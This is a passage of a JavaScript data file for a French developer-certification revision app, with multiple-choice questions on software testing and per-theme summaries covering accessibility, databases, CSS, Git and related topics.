            "explanation": "Panier d'outils typique :\n- tests unitaires : PHPUnit (PHP), Jest/Vitest (JavaScript), JUnit (Java), pytest (Python) ;\n- tests d'API : Postman/Newman (collections exécutables en CI), ou tests dédiés dans le framework ;\n- tests de bout en bout : Cypress, Playwright, Selenium (parcourent le vrai navigateur) ;\n- qualité et couverture : Xdebug + PHPUnit --coverage, Istanbul, SonarQube ;\n- tests de charge : k6, JMeter.\nConseil d'oral : citer les outils réellement utilisés dans le projet avec un exemple de test écrit (nom du test, ce qu'il vérifie) - bien plus convaincant qu'une liste générique."
        },
        {
            "theme": "Les tests",
            "question": "Qu'est-ce que le taux de couverture de code et quel est un bon objectif ?",
            "level": "Intermédiaire",
            "filiere": "CDA",
            "answers": [
                "Le pourcentage de lignes et de branches exécutées par les tests automatisés ; un objectif courant est de 70-80% sur le code métier, en privilégiant la pertinence des tests plutôt qu'un chiffre absolu",
                "Le pourcentage du disque dur occupé par les tests",
                "La part des développeurs qui relisent le code",
                "Un indicateur du nombre d'utilisateurs couverts par la documentation"
            ],
            "correct": 0,
            "explanation": "La couverture mesure les lignes, branches (les deux branches des if) et fonctions exécutées par les tests. Outils : Xdebug/PHPUnit, Istanbul (JS), SonarQube.\nInterprétation honnête :\n- 100% ne prouve pas l'absence de bugs (des tests sans assertions réelles peuvent tout 'couvrir') ;\n- viser 100% partout coûte très cher pour peu de valeur ;\n- en dessous d'environ 50% sur le code métier, les refactoring deviennent risqués.\nBonne pratique : viser 100% sur les règles métier critiques et le code à risque, 70-80% globalement, et écrire des tests significatifs (cas limites, cas d'erreur) plutôt que des tests triviaux pour gonfler le chiffre."
        },
        {
            "theme": "Les tests",
            "question": "Comment testez-vous une méthode métier complexe ?",
            "level": "Intermédiaire",
            "filiere": "CDA",
            "answers": [
                "En la testant uniquement en production avec de vrais clients",
                "En la supprimant, car une méthode complexe ne peut pas être testée",
                "En la recopiant dans la console du navigateur pour voir ce qu'elle donne",
                "En vérifiant qu'elle reste testable (une responsabilité, dépendances injectables), puis en écrivant des tests unitaires par cas : nominal, cas limites (bornes, zéro, vide), cas d'erreur, avec des dépendances mockées et des assertions précises"
            ],
            "correct": 3,
            "explanation": "Démarche attendue :\n1. s'assurer que la méthode est testable : une seule responsabilité, dépendances injectables ; sinon refactoring d'abord ;\n2. lister les cas : nominal (remise de 10% dès 100 euros), limites (panier à exactement 100 euros, panier vide), erreurs (donnée manquante) ;\n3. mocker les dépendances (repository, horloge) pour isoler la logique ;\n4. structure Arrange-Act-Assert : préparer les données, appeler la méthode, vérifier le résultat avec des assertions explicites ;\n5. ajouter un test de non-régression à chaque bug corrigé.\nCette question vérifie la discipline de test du candidat, au-delà de la simple connaissance des outils."
        }
    ]
};

const themeSyntheses = {
    "Accessibilité": {
        definition: "L'accessibilité consiste à rendre un site ou une application utilisable par le plus grand nombre, y compris avec clavier, lecteur d'écran et contrastes adaptés.",
        keyFacts: [
            "Le focus visible, les labels et les contrastes sont essentiels.",
            "Les lecteurs d'écran lisent les balises, les textes alternatifs et les rôles ARIA avec précaution.",
            "Les composants interactifs doivent être utilisables au clavier sans piège."
        ],
        pitfalls: [
            "Oublier le focus visible ou le tabindex sur des éléments dynamiques.",
            "Utiliser des contrastes trop faibles sur du texte important.",
            "Rendre un contenu visible uniquement par couleur ou par image."
        ],
        takeaways: [
            "Le code doit être compréhensible par les utilisateurs et les technologies d'assistance.",
            "L'accessibilité est un devoir fonctionnel, pas seulement esthétique.",
            "Testez avec clavier, zoom et lecteurs d'écran pour valider la navigation."
        ]
    },
    "L'accessibilité": {
        definition: "L'accessibilité consiste à rendre un site ou une application utilisable par le plus grand nombre, y compris avec clavier, lecteur d'écran et contrastes adaptés.",
        keyFacts: [
            "Le focus visible, les labels et les contrastes sont essentiels.",
            "Les lecteurs d'écran lisent les balises, les textes alternatifs et les rôles ARIA avec précaution.",
            "Les composants interactifs doivent être utilisables au clavier sans piège."
        ],
        pitfalls: [
            "Oublier le focus visible ou le tabindex sur des éléments dynamiques.",
            "Utiliser des contrastes trop faibles sur du texte important.",
            "Rendre un contenu visible uniquement par couleur ou par image."
        ],
        takeaways: [
            "Le code doit être compréhensible par les utilisateurs et les technologies d'assistance.",
            "L'accessibilité est un devoir fonctionnel, pas seulement esthétique.",
            "Testez avec clavier, zoom et lecteurs d'écran pour valider la navigation."
        ]
    },
    "Algorithmes": {
        definition: "Les algorithmes décrivent la manière logique de résoudre un problème, avec des étapes ordonnées, des conditions et des boucles.",
        keyFacts: [
            "La complexité temporelle et spatiale aide à comparer les solutions.",
            "Un bon algorithme est lisible, correct et efficient.",
            "Les structures de données et les boucles influence directement la performance."
        ],
        pitfalls: [
            "Choisir une solution plus compliquée que nécessaire.",
            "Oublier les cas limites, bordures et valeurs nulles.",
            "Confondre logique métier et optimisation premature."
        ],
        takeaways: [
            "Comprendre le problème avant de choisir l'algorithme.",
            "Tester les cas limites fait gagner du temps et évite les erreurs.",
            "La simplicité est souvent la meilleure solution."
        ]
    },
    "Base de données": {
        definition: "Une base de données stocke, organise et relie les informations de manière structurée pour les requêtes, la sécurité et la cohérence.",
        keyFacts: [
            "La clé primaire identifie de façon unique chaque enregistrement.",
            "La clé étrangère relie deux tables entre elles.",
            "SQL permet de sélectionner, insérer, mettre à jour et supprimer des données."
        ],
        pitfalls: [
            "Oublier les jointures ou les dépendances entre tables.",
            "Confondre clé primaire et clé étrangère.",
            "Ignorer l'intégrité référentielle."
        ],
        takeaways: [
            "Les tables doivent refléter des entités métier cohérentes.",
            "Les relations structurent les données et évitent les doublons.",
            "Le bon schéma est essentiel pour la stabilité d'une application."
        ]
    },
    "CI/CD & Déploiement": {
        definition: "La CI/CD vise à automatiser les tests, la validation et le déploiement d'une application pour livrer plus vite et plus sereinement.",
        keyFacts: [
            "La CI exécute des tests à chaque modification de code.",
            "La CD publie automatiquement vers un environnement de test ou de production.",
            "Docker et les environnements reproductibles réduisent les écarts de configuration."
        ],
        pitfalls: [
            "Ne pas tester avant le déploiement.",
            "Mettre en production sans environnement de validation.",
            "Ignorer les versions de dépendances et les secrets."
        ],
        takeaways: [
            "L'automatisation réduit les erreurs humaines et les retours de bug.",
            "La reproductibilité est un enjeu majeur pour la fiabilité.",
            "Le déploiement doit être surveillé, traçable et reversible."
        ]
    },
    "JS - JavaScript": {
        definition: "JavaScript permet de manipuler le DOM, gérer les interactions utilisateur et orchestrer la logique front-end d'une application web.",
        keyFacts: [
            "Les variables, fonctions, boucles et conditions structurent le code.",
            "Le DOM représente la structure HTML modifiable en temps réel.",
            "Les événements permettent d'interagir avec les boutons, formulaires et pages."
        ],
        pitfalls: [
            "Oublier la différence entre var, let et const.",
            "Manipuler le DOM sans vérifier ses éléments.",
            "Ne pas gérer les cas d'erreur et la logique asynchrone."
        ],
        takeaways: [
            "JavaScript est la couche de logique de l'interface.",
            "La clarté du code évite les bugs et les oublis.",
            "Les interactions doivent rester prévisibles et testables."
        ]
    },
    "La POO": {
        definition: "La programmation orientée objet structure le code autour d'objets, de classes, d'attributs et de méthodes afin de mieux organiser les responsabilités.",
        keyFacts: [
            "Une classe décrit un modèle, un objet en est une instance.",
            "L'encapsulation protège les données internes.",
            "L'héritage et le polymorphisme favorisent la réutilisation et la flexibilité."
        ],
        pitfalls: [
            "Créer des classes trop larges avec trop de responsabilités.",
            "Confondre hiérarchie et dépendance.",
            "Négliger la lisibilité des noms."
        ],
        takeaways: [
            "La POO aide à organiser des projets plus complexes.",
            "Chaque classe doit avoir une responsabilité claire.",
            "Le code orienté objet reste lisible si la conception est simple."
        ]
    },
    "L'architecture": {
        definition: "L'architecture logiciel décrit la manière dont les composants d'une application s'organisent et communiquent entre eux.",
        keyFacts: [
            "La séparation des responsabilités facilite la maintenance.",
            "Les couches (présentation, métier, données) aident à structurer le code.",
            "Une bonne architecture limite le couplage entre modules."
        ],
        pitfalls: [
            "Tout mettre dans un seul fichier ou une seule classe.",
            "Créer des dépendances circulaires entre modules.",
            "Choisir une architecture trop lourde pour le besoin."
        ],
        takeaways: [
            "L'architecture doit servir le projet, pas le contraire.",
            "La clarté de structure reste un avantage pour les équipes.",
            "Une bonne architecture réduit la dette technique."
        ]
    },
    "Le Clean Code": {
        definition: "Le Clean Code vise à écrire un logiciel lisible, maintenable et compréhensible par l'équipe, sans complexité inutile.",
        keyFacts: [
            "Les noms explicites améliorent la compréhension du code.",
            "Le refactoring améliore la structure sans changer le comportement.",
            "DRY, KISS et YAGNI sont des principes clés."
        ],
        pitfalls: [
            "Multiplier les commentaires au lieu d'améliorer le code.",
            "Écrire des fonctions trop longues ou trop complexes.",
            "Duppliquer la logique dans plusieurs endroits."
        ],
        takeaways: [
            "Le code lisible est maintenable sur le long terme.",
            "Les principes sont là pour simplifier, pas pour compliquer.",
            "La qualité du code se vérifie d'abord par sa clarté."
        ]
    },
    "Le CSS": {
        definition: "Le CSS détermine la présentation visuelle d'un site : layout, couleurs, espaces, typographie et états des éléments.",
        keyFacts: [
            "Les sélecteurs ciblent les éléments selon leur balise, classe ou attribut.",
            "Le box model est fondamental pour comprendre marges, bordures et padding.",
            "Flexbox et Grid organisent les pages de manière robuste."
        ],
        pitfalls: [
            "Oublier la cohérence des espacements et du design system.",
            "Poser des règles CSS trop spécifiques et difficiles à maintenir.",
            "Ne pas tester les responsive breakpoints."
        ],
        takeaways: [
            "Le CSS structure le rendu visuel et l'expérience utilisateur.",
            "La cohérence visuelle renforce la crédibilité du produit.",
            "Le responsive design doit être pensé dès le départ."
        ]
    },
    "Le DOM": {
        definition: "Le DOM est la représentation en mémoire de la page HTML manipulable en JavaScript pour modifier le contenu, la structure et le style.",
        keyFacts: [
            "Le DOM reflète l'arbre HTML de la page.",
            "querySelector et addEventListener sont des outils essentiels.",
            "Les modifications du DOM doivent être ciblées et lisibles."
        ],
        pitfalls: [
            "Sélectionner un mauvais élément ou trop de nodes.",
            "Modifier le DOM sans gestion des événements.",
            "Créer du code duplicatif pour des actions simples."
        ],
        takeaways: [
            "Le DOM est le point de contact entre HTML et JavaScript.",
            "Une bonne manipulation du DOM évite les bugs visibles.",
            "Les interactions doivent toujours rester cohérentes avec l'état applicatif."
        ]
    },
    "Le HTML": {
        definition: "Le HTML structure le contenu d'une page web avec des éléments, des balises et des relations sémantiques.",
        keyFacts: [
            "Les balises donnent du sens au contenu : header, main, section, article, footer.",
            "Les formulaires et labels sont essentiels à l'interaction.",
            "Les attributs alt, href et aria améliorent l'usage et l'accessibilité."
        ],
        pitfalls: [
            "Utiliser des divs sans structure claire.",
            "Ne pas renseigner les attributs de formulaire et d'image.",
            "Ignorer la sémantique et la hiérarchie des titres."
        ],
        takeaways: [
            "Le HTML donne la structure, le CSS le style, le JS la logique.",
            "La sémantique aide l'utilisateur et les moteurs de recherche.",
            "Un bon HTML rend le site plus robuste et accessible."
        ]
    },
    "Le projet et les méthodes": {
        definition: "Le management de projet et les méthodes de travail structurent la planification, les tâches, les priorités et la coopération en équipe.",
        keyFacts: [
            "Le diagramme de Gantt aide à visualiser les tâches sur le temps.",
            "Le tableau Kanban permet de suivre le flux de travail visuellement.",
            "Les méthodes agiles favorisent l'adaptation, la livraison progressive et les retours rapides."
        ],
        pitfalls: [
            "Ne pas clarifier les responsabilités et les dépendances.",
            "Gérer les tâches sans priorisation et sans suivi.",
            "Oublier la communication et les risques."
        ],
        takeaways: [
            "Le bon fonctionnement d'un projet repose sur la clarté et la communication.",
            "Les outils de gestion servent à organiser, pas à compliquer.",
            "Un bon planning réduit le stress de l'équipe."
        ]
    },
    "Le responsive design": {
        definition: "Le responsive design permet à une interface de s'adapter aux écrans mobiles, tablettes et ordinateurs sans casser l'expérience utilisateur.",
        keyFacts: [
            "Les media queries modifient le rendu selon la largeur de l'écran.",
            "Les composants doivent rester lisibles et utilisables en mobile.",
            "Des breakpoints bien choisis évitent les mauvaises redistributions."
        ],
        pitfalls: [
            "Penser au desktop uniquement puis corriger trop tard.",
            "Ne pas vérifier les tailles de texte et de boutons.",
            "Utiliser des layouts rigides qui cassent sur petits écrans."
        ],
        takeaways: [
            "Le design mobile-first réduit souvent les erreurs de conception.",
            "L'expérience utilisateur guide les choix d'ergonomie.",
            "Un site responsive est plus durable et plus accessible."
        ]
    },
    "Le versioning": {
        definition: "Le versioning permet de conserver l'historique du code, de collaborer et de revenir en arrière en cas de problème.",
        keyFacts: [
            "Git permet de suivre les modifications du projet.",
            "Les branches séparent les travaux et les fonctionnalités.",
            "Les commits doivent être lisibles et cohérents."
        ],
        pitfalls: [
            "Faire des commits trop lourds ou trop peu explicites.",
            "Oublier de créer des branches pour une fonctionnalité.",
            "Ne pas vérifier les conflits avant fusion."
        ],
        takeaways: [
            "Le versioning protège la qualité du projet et le travail d'équipe.",
            "Les commits lisibles facilitent la revue de code.",
            "La traçabilité est un gain important pour la maintenance."
        ]
    },
    "L'environnement": {
        definition: "L'environnement de développement regroupe les outils, dépendances, versions et paramètres nécessaires pour exécuter le projet dans des conditions cohérentes.",
        keyFacts: [
            "Les versions de Node, PHP ou Python doivent rester cohérentes.",
            "Les variables d'environnement protègent les secrets et les paramètres spécifiques.",
            "Les environnements local, test et production doivent être distincts."
        ],
        pitfalls: [
            "Ignorer les dépendances cachées ou les versions de runtime.",
            "Hardcoder des secrets dans le code source.",
            "Confondre environnement de dev et de prod."
        ],
        takeaways: [
            "Le bon environnement évite les erreurs de reproduction.",
            "La cohérence des versions réduit les 'ça marche chez moi'.",
            "La sécurité passe aussi par la maîtrise de l'environnement."
        ]
    },
    "Les IDE": {
        definition: "Un IDE est un environnement de développement intégré qui aide à écrire, tester, déboguer et organiser le code.",
        keyFacts: [
            "L'éditeur fournit coloration, auto-complétion et navigation rapide.",
            "Le débogueur aide à suivre l'exécution pas à pas.",
            "Les outils intégrés améliorent la productivité et la qualité."
        ],
        pitfalls: [
            "Ne pas utiliser les raccourcis ou les outils de debug.",
            "Oublier la configuration du projet dans l'IDE.",
            "Négliger les extensions utiles ou les conventions d'équipe."
        ],
        takeaways: [
            "Un bon IDE accélère le développement.",
            "Les outils doivent servir la qualité du code et non le contraire.",
            "Le confort de travail impacte la concentration et la fiabilité."
        ]
    },
    "Les maquettes": {
        definition: "Les maquettes sont des représentations visuelles d'une interface qui permettent de formaliser le design avant la mise en œuvre.",
        keyFacts: [
            "Les maquettes aident à valider le parcours utilisateur et la hiérarchie visuelle.",
            "On distingue souvent maquette low-fidelity et high-fidelity.",
            "Le design doit être pensé pour l'utilisateur avant le code."
        ],
        pitfalls: [
            "Coder sans maquette ni structure claire.",
            "Créer une interface belle mais peu compréhensible.",
            "Ignorer les besoins métier et l'accessibilité."
        ],
        takeaways: [
            "Le design UX commence par une clarification des besoins.",
            "Une maquette réduit les erreurs et les retours entre équipes.",
            "La qualité de l'interface vient du bon équilibre entre utilité et lisibilité."
        ]
    },
    default: {
        definition: "Ce thème demande une consolidation des fondamentaux : définition, cas d'usage, pièges fréquents et points à retenir pour l'oral.",
        keyFacts: [
            "Identifier le concept central du thème.",
            "Connaître au moins un exemple concret.",
            "Savoir expliquer en 1 à 2 phrases les points essentiels."
        ],
        pitfalls: [
            "Rester trop vague dans la réponse.",
            "Ne pas relier le concept à un exemple.",
            "Oublier les cas limites ou les erreurs fréquentes."
        ],
        takeaways: [
            "Le raisonnement compte autant que la formule ou le nom exact.",
            "Une réponse claire vaut mieux qu'une réponse longue et floue.",
            "L'oral repose sur la capacité à synthétiser avec précision."
        ]
    }
};
